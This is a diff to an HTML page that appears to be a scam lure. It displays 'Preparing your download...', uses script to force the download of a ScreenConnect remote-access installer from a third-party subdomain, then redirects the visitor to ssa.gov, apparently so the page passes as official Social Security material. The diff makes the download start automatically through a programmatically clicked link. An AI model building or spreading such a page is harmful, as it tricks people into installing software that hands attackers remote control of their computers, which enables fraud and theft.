@@ -6,13 +6,18 @@
 </head>
 <body>
 
-<p>Please wait...</p>
+<p>Preparing your download...</p>
 
 <script>
-    // Open the download link
-    window.open("https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi");
+    // Start file download
+    const link = document.createElement("a");
+    link.href = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
+    link.download = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
-    // Redirect current page after a delay
+    // Redirect after a short delay
     setTimeout(function () {
         window.location.href = "https://www.ssa.gov";
     }, 3000);
